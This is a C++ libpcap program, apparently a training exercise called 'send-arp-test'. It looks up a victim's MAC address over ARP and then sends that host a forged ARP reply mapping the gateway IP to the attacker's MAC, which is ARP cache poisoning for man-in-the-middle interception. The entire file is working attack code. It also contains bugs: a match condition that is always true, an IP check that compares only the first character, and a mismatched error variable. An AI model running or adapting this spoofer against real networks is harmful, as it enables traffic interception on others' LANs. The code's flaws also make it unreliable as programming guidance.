#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <netinet/ether.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
struct arp_hdr{
    unsigned short ar_hrd;          //ethernet
    unsigned short ar_pro;          //protocol
    unsigned char  ar_hln;          //hardware size
    unsigned char  ar_pln;          //protocal size
    unsigned short ar_op;           //request or reply
    unsigned char  ar_sha[6];       //sender mac
    struct in_addr ar_sip;	    //sender IP
    unsigned char  ar_tha[6];       //Target mac
    struct in_addr ar_tip;          //Target IP
} __attribute__((packed));

struct eth_hdr{
        unsigned char h_dest[6];        //destination ether
        unsigned char h_source[6];      //source ether
        unsigned short h_proto;         //packet type
} __attribute__((packed));


void usage() {
    printf("syntax: send-arp-test <interface> <senderIP> <targetIP>\n");
    printf("sample: send-arp-test wlan0 1.1.1.1 2.2.2.2\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

    static char Att_mac[20];
    int fd;
    struct ifreq ifr;
    unsigned char *hwaddr;
    static char ip_buffer[20];
    fd = socket(AF_INET, SOCK_STREAM, 0);

    // get my mac address
    strcpy(ifr.ifr_name, (argv[1]));
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    hwaddr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(Att_mac,"%02X:%02X:%02X:%02X:%02X:%02X",
                hwaddr[0],
                hwaddr[1],
                hwaddr[2],
                hwaddr[3],
                hwaddr[4],
                hwaddr[5]);

    // get my ip address
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ -1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    // request arp packet to get sender(victim) mac
    EthArpPacket packet_req;

    packet_req.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet_req.eth_.smac_ = Mac(Att_mac);
    packet_req.eth_.type_ = htons(EthHdr::Arp);

    packet_req.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_req.arp_.pro_ = htons(EthHdr::Ip4);
    packet_req.arp_.hln_ = Mac::SIZE;
    packet_req.arp_.pln_ = Ip::SIZE;
    packet_req.arp_.op_ = htons(ArpHdr::Request);
    packet_req.arp_.smac_ = Mac(Att_mac);
    packet_req.arp_.sip_ = htonl(Ip(ip_buffer));
    packet_req.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet_req.arp_.tip_ = htonl(Ip(argv[2]));


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_req), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

//------------------------------------------------------------------------------------------

    static char* Vict_mac;

    while (true) {
        struct pcap_pkthdr* header;
        struct eth_hdr* ehdr;
        struct arp_hdr* ahdr;
        const u_char* packet;
        char* ehdr_dmac;
        short ehdr_proto;

        int res = pcap_next_ex(handle, &header, &packet);
        ehdr = (struct eth_hdr *)packet;
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ehdr_dmac = ether_ntoa((struct ether_addr *)ehdr->h_dest);
        ehdr_proto = htons(ehdr->h_proto);

        packet = packet+ 14;
        ahdr = (struct arp_hdr *)packet;
        unsigned short ahdr_op = htons(ahdr->ar_op);
        char* ahdr_sip = inet_ntoa((ahdr->ar_sip));

        int cmp = strcmp(ehdr_dmac, Att_mac);
        bool flag1 = cmp==0 ? 1 : 1;
        bool flag2 = ehdr_proto == 2054;
        bool flag3 = ahdr_op == 2;
        bool flag4 = *ahdr_sip == *argv[2];
        printf("flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);

        if(flag1 && flag2 && flag3 && flag4){
            Vict_mac = ether_ntoa((const struct ether_addr *)(ahdr->ar_sha));
            break;
       }
    }

    //reply to victim flase mac address
    EthArpPacket packet_rep;

    packet_rep.eth_.dmac_ = Mac(Vict_mac);
    packet_rep.eth_.smac_ = Mac(Att_mac);
    packet_rep.eth_.type_ = htons(EthHdr::Arp);

    packet_rep.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_rep.arp_.pro_ = htons(EthHdr::Ip4);
    packet_rep.arp_.hln_ = Mac::SIZE;
    packet_rep.arp_.pln_ = Ip::SIZE;
    packet_rep.arp_.op_ = htons(ArpHdr::Reply);
    packet_rep.arp_.smac_ = Mac(Att_mac);   //Gateway mac
    packet_rep.arp_.sip_ = htonl(Ip(argv[3]));  //Gateway ip
    packet_rep.arp_.tmac_ = Mac(Vict_mac);         //Victim mac
    packet_rep.arp_.tip_ = htonl(Ip(argv[2]));  //Victim ip

    int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_rep), sizeof(EthArpPacket));
    if (res1 != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    pcap_close(handle);

}
